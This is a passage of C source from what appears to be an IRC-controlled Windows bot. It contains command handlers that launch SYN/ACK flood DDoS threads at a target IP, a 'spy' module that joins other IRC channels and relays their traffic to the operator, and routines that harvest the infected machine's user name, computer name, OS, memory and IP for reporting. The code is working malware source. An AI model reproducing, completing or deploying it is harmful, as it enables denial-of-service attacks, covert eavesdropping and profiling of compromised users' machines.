				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

				return 1;
			}
			else if (strcmp("wonk.syn", a[s]) == 0 || strcmp("wonk.ack", a[s]) == 0) {
				DDOS ddos;
				strncpy(ddos.ip, a[s+1], sizeof(ddos.ip)-1);
				//strncpy(ddos.port, a[s+2], sizeof(ddos.port)-1);
				strncpy(ddos.length, a[s+2], sizeof(ddos.length)-1);
				strncpy(ddos.chan, a[2], sizeof(ddos.chan)-1);
				strncpy(ddos.type,a[s],32);
				ddos.notice = notice;
				ddos.silent = silent;
				ddos.sock = sock;

				sprintf(sendbuf, "[DDoS]: Flooding: (%s) for %s seconds.", a[s+1], a[s+2]);
				ddos.threadnum = addthread(sendbuf,DDOS_THREAD,NULL);

				if (threads[ddos.threadnum].tHandle = CreateThread(NULL, 0, &DDOSWonkThread, (LPVOID)&ddos, 0, &id)) {
					while(ddos.gotinfo == FALSE)
						Sleep(50);
				} else
					sprintf(sendbuf,"[DDoS]: Failed to start flood thread, error: <%d>.", GetLastError());

				if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
				addlog(sendbuf);

			}
			#endif
			#ifndef NO_SPY
			else if (strcmp("spy", a[s]) == 0 || strcmp("sp", a[s]) == 0) {
				ircs sirc;
				strncpy(sirc.nick,  a[s+1], sizeof(sirc.nick)-1);
				strncpy(sirc.host,  a[s+2], sizeof(sirc.host)-1);
				sirc.port = atoi(a[s+3]);
				strncpy(sirc.channel,  a[s+4], sizeof(sirc.channel)-1);
				if (a[s+5] != NULL) strncpy(sirc.chanpass,  a[s+5], sizeof(sirc.chanpass)-1);
				strncpy(sirc.hchan,  a[2], sizeof(sirc.hchan)-1);
				sirc.sock = sock;
				sirc.spy = 1;
				sprintf(sendbuf, "spy (%s)", sirc.host);
				sirc.threadnum = addthread(sendbuf,SPY_THREAD,NULL);
				strncpy(cnick[sirc.threadnum], sirc.nick, sizeof(cnick[sirc.threadnum])-1);
				if (!silent) {
					sprintf(sendbuf, "spy created on %s:%d, in channel %s.\r\n", sirc.host, sirc.port, sirc.channel);
					irc_privmsg(sock, a[2], sendbuf, notice);
				}
				threads[sirc.threadnum].tHandle = CreateThread(NULL, 0, &irc_connect, (void *)&sirc, 0, &id);
				while(1) {
					if (sirc.gotinfo == TRUE) break;
					Sleep(50);
				}
			}
			#endif
		}
	}
	return repeat;
 }


 #ifndef NO_SPY
// function for spies to parse lines
 int irc_spyparseline(char *line, SOCKET sock, char *channel, char *chanpass, char *nick1, SOCKET hsock, char *hchannel, char *server)
 {
	char line1[IRCLINE];
	char line2[IRCLINE];
	int i;
	char *a[32];
	char a0[128];
	char nick[16];
	//[Tsuna] <fix reason="potential buffer overflow, most servers will allow 512+">
	//char sendbuf[256];
	char sendbuf[1024];
	//[Tsuna] </fix>

	strncpy(nick, nick1, sizeof(nick)-1);

	if (line == NULL) return 1;
	memset(line1, 0, sizeof(line1));
	memset(line2, 0, sizeof(line2));
	strncpy(line1, line, sizeof(line1)-1);
	strncpy(line2, line, sizeof(line2)-1);

	// split the current line up into seperate words
	a[0] = strtok(line2, " ");
	for(i = 1; i < 32; i++) a[i] = strtok(NULL, " ");

	if(a[1] == NULL) return 1;
	if(a[0][0] != '\n') strncpy(a0,  a[0], sizeof(a0)-1);

	// pong if we get a ping request from the server
	if(strcmp("PING", a[0]) == 0) {
		irc_sendf(sock, "PONG %s\r\n", a[1]+1);
		irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
	}

	// looks like we're connected to the server, let's join the channel
	if(strcmp("001", a[1]) == 0 || strcmp("005", a[1]) == 0) irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);

	else if (strcmp("353", a[1]) == 0) {
		char *m = strstr(line1, a[5]);
		if (m != NULL) {
			_snprintf(sendbuf, sizeof(sendbuf), "[%s] *** Users in %s: %s", server, a[4], m+1);
			irc_privmsg(hsock, hchannel, sendbuf, FALSE);
		}
	}

	else if (strcmp("433", a[1]) == 0) {
		sprintf(sendbuf, "[%s] *** Nick %s already in use.", server, nick1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
		rndnick(sock,nick1,nickprefix,nicktype);
		irc_sendf(sock, "NICK %s\r\n", nick1);
		sprintf(sendbuf, "[%s] *** Trying to change nick to %s", server, nick1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("JOIN", a[1]) == 0) {
		sprintf(sendbuf, "[%s] --> Joins: %s joined", a[2]+1, strtok(line1, " ")+1);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("PART", a[1]) == 0) {
		char *p = strchr(line1, ':');
        p = strchr(++p, ':'); // this is where we get the quit msg
		sprintf(sendbuf, "[%s] <-- Parts: %s left the channel (%s)", a[2]+1, strtok(line1, " ")+1, ++p);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("KICK", a[1]) == 0) {
		char *k = strchr(line1, ':');
        k = strchr(++k, ':'); // this is where we get the kick msg
        
		if (strcmp(nick, a[3]) == 0) {
			irc_sendf2(sock, "JOIN %s %s\r\n", channel, chanpass);
			_snprintf(sendbuf, sizeof(sendbuf), "(!) I was kicked by %s (%s)\r\n", strtok(line1, " ")+1, ++k);
		} else _snprintf(sendbuf, sizeof(sendbuf), "[%s] *** %s was kicked by %s (%s)\r\n", a[2], a[3], strtok(line1, " ")+1, ++k);
		
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("QUIT", a[1]) == 0) {
        char *q = strchr(line1, ':');
        q = strchr(++q, ':'); // this is where we get the quit msg
        _snprintf(sendbuf, sizeof(sendbuf), "[%s] <<< Quits: %s (%s)", server, strtok(line1, " ")+1, ++q);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("NICK", a[1]) == 0) {
		char *oldnck = strtok(a[0], "!") + 1;
		char *newnck = a[2] + 1;
		if (oldnck != NULL && newnck != NULL) if (strcmp(oldnck, nick1) == 0) strncpy(nick1,  newnck, 15);
		sprintf(sendbuf, "[%s] *** %s is now known as %s", server, oldnck, newnck);
		irc_privmsg(hsock, hchannel, sendbuf, FALSE);
	}

	else if (strcmp("MODE", a[1]) == 0) {
		char *u = strtok(a[0], "!") + 1;
		char *m = strstr(line1, a[3]);
			if (m != NULL) {
				_snprintf(sendbuf, sizeof(sendbuf), "[%s] *** %s sets mode: %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
	}

	else if (strcmp("PRIVMSG", a[1]) == 0 || strcmp("NOTICE", a[1]) == 0) {
		if (strstr(a[2], "#") == NULL) a[2] = strtok(a[0], "!") + 1;
		a[3]++;
		char *u = strtok(a[0], "!") + 1;
		if(*a[3] == '\1') {
		    if (strcmp("\1ACTION", a[3]) == 0) { // that's a /me ...
    			char *m = strstr(line1, "ACTION");
    			if (m != NULL) {
    				m += 7;
    				_snprintf(sendbuf, sizeof(sendbuf), "[%s] * %s %s", a[2], u, strtok(m, "\1"));
    				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
    			}
    		} else { // that's another CTCP (bleh)
    		    char *c = strchr(line1, ':');
                c = strchr(++c, ':');
    		    _snprintf(sendbuf, sizeof(sendbuf), "[%s] Received CTCP %s from %s (%s)", a[2], a[3]+1, u, ++c);
    		    irc_privmsg(hsock, hchannel, sendbuf, FALSE);
    		}
		} else {
			char *m = strstr(line1, " :");
			if (m != NULL) {
				m += 2;
				_snprintf(sendbuf, sizeof(sendbuf), "[%s] <%s> %s", a[2], u, m);
				irc_privmsg(hsock, hchannel, sendbuf, FALSE);
			}
		}
	}

	return 1;
 }
 #endif


// irc send functions
 void irc_send(SOCKET sock, char *msg)
 {
	char msgbuf[IRCLINE];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, "%s\r\n", msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }


 void irc_sendf(SOCKET sock, char *msg, char *str)
 {
	char msgbuf[IRCLINE];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_sendf2(SOCKET sock, char *msg, char *str, char *str2)
 {
	char msgbuf[IRCLINE];

	memset(msgbuf, 0, sizeof(msgbuf));
	sprintf(msgbuf, msg, str, str2);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

 void irc_privmsg(SOCKET sock, char *dest, char *msg, BOOL notice)
 {
	char msgbuf[IRCLINE];
	char *action;

	memset(msgbuf, 0, sizeof(msgbuf));
	if (notice) action = "NOTICE"; else action = "PRIVMSG";
	sprintf(msgbuf, "%s %s :%s\r\n", action, dest, msg);
	send(sock, msgbuf, strlen(msgbuf), 0);
 }

// search-and-replace function for strings
 char * replacestr(char *str, char *oldstr, char *newstr)
 {
	char *p;
	char str2[IRCLINE];
	char str3[IRCLINE];
	char str4[IRCLINE];

	memset(str2, 0, sizeof(str2));
	memset(str3, 0, sizeof(str3));
	memset(str4, 0, sizeof(str4));
	strncpy(str2,  str, sizeof(str2)-1);
	if (strlen(newstr) > 384) newstr[384] = '\0';

	while (strstr(str2, oldstr) != NULL) {
		p = strstr(str2, oldstr);
		strncpy(str4,  p + strlen(oldstr), sizeof(str4)-1);
		p[0] = '\0';
		strncpy(str3,  str2, sizeof(str3)-1);
		if (p+1 != NULL && oldstr-1 != NULL) if (strlen(p+1) > strlen(oldstr-1)) sprintf(str2, "%s%s%s", str3, newstr, str4);
		 else sprintf(str2, "%s%s", str3, newstr);
		if (strstr(oldstr, newstr) != NULL) break;
	}
	strncpy(str,  str2, strlen(str2)+1);
	return str;
 }

 #ifndef NO_NETINFO
// function used for netinfo
 char * netinfo(char *ninfo, char *host, SOCKET sock)
 {

	SOCKADDR sa;
	int sas;
	DWORD n;
	char ctype[8];
	char cname[128];

	// get connection type/name
	memset(cname, 0, sizeof(cname));
	memset(ctype, 0, sizeof(ctype));
	if (!noigcse) {
		fInternetGetConnectedStateEx(&n, (char *)&cname, sizeof(cname), 0);
    	if (n & INTERNET_CONNECTION_MODEM == INTERNET_CONNECTION_MODEM) strncpy(ctype,  "dial-up", sizeof(ctype)-1);
	 	else strncpy(ctype,  "LAN", sizeof(ctype)-1);
	} else {
		strncpy(ctype, "N/A", sizeof(ctype)-1);
		strncpy(cname, "N/A", sizeof(cname)-1);
	}

	// get ip address
	sas = sizeof(sa);
	memset(&sa, 0, sizeof(sa));
	getsockname(sock, &sa, &sas);

	sprintf(ninfo, "connection type: %s (%s). local IP address: %d.%d.%d.%d. connected from: %s", ctype, cname, (BYTE)sa.sa_data[2], (BYTE)sa.sa_data[3], (BYTE)sa.sa_data[4], (BYTE)sa.sa_data[5], host);
	return ninfo; // return the netinfo string
 }
 #endif

 #ifndef NO_SYSINFO
// function used for sysinfo
 char * sysinfo(char *sinfo)
 {
	int total;
	MEMORYSTATUS memstat;
	OSVERSIONINFO verinfo;
	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
	char *szCompname;
	TCHAR szUserName[21];
	DWORD dwUserSize = sizeof(szUserName);

	GlobalMemoryStatus(&memstat); // load memory info into memstat
	verinfo.dwOSVersionInfoSize = sizeof(OSVERSIONINFO); // required for some strange reason
	GetVersionEx(&verinfo); // load version info into verinfo
	char *os;
	char os2[140];
	if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 0) {
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_WINDOWS) os = "95";
		if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT) os = "NT";
	}
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 10) os = "98";
	else if (verinfo.dwMajorVersion == 4 && verinfo.dwMinorVersion == 90) os = "ME";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 0) os = "2000";
	else if (verinfo.dwMajorVersion == 5 && verinfo.dwMinorVersion == 1) os = "XP";
	else os = "???";

	if (verinfo.dwPlatformId == VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0] != '\0') {
		sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion);
		os = os2;
	}

	total = GetTickCount() / 1000; // GetTickCount() / 1000 = seconds since os started.

	GetComputerName(szBuffer, &dwNameSize);
	szCompname = szBuffer;
	GetUserName(szUserName, &dwUserSize);

	sprintf(sinfo, "cpu: %dMHz. ram: %dMB total, %dMB free. os: Windows %s (%d.%d, build %d). uptime: %dd %dh %dm. box: %s. user: %s.",
		cpuspeed(), memstat.dwTotalPhys / 1048576, memstat.dwAvailPhys / 1048576,
		os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total / 86400, (total % 86400) / 3600, ((total % 86400) % 3600) / 60, szCompname, szUserName);

	return sinfo; // return the sysinfo string
 }

// cpu speed function
 int cpuspeed(void)
 {
	unsigned __int64 startcycle;
	unsigned __int64 speed, num, num2;

	do {
		startcycle = cyclecount();
		Sleep(1000);
		speed = ((cyclecount()-startcycle)/100000)/10;
	} while (speed > 1000000); // if speed is 1000GHz+, then something probably went wrong so we try again =P

	// guess 'real' cpu speed by rounding raw cpu speed (something like 601mhz looks kinda tacky)
	num = speed % 100;
	num2 = 100;
	if (num < 80) num2 = 75;
	if (num < 71) num2 = 66;
	if (num < 55) num2 = 50;
	if (num < 38) num2 = 33;
	if (num < 30) num2 = 25;
	if (num < 10) num2 = 0;
	speed = (speed-num)+num2;

	return speed;
 }

// asm for cpuspeed() (used for counting cpu cycles)
 unsigned __int64 cyclecount(void)
 {
 	#if defined (__LCC__) // this code is for lcc
	unsigned __int64 count = 0;
	_asm ("rdtsc\n"
		  "mov %eax,%count\n");
	return count;

	#elif defined (__GNUC__) // this code is for GCC
	unsigned __int64 count = 0;
	__asm__ ("rdtsc;movl %%eax, %0" : "=r" (count));
	return count;

	#else // this code is for MSVC, may work on other compilers (ignore the warnings, MSVC is stupid...)
	_asm {
		_emit 0x0F;
		_emit 0x31;
	}
	#endif
 }
#endif
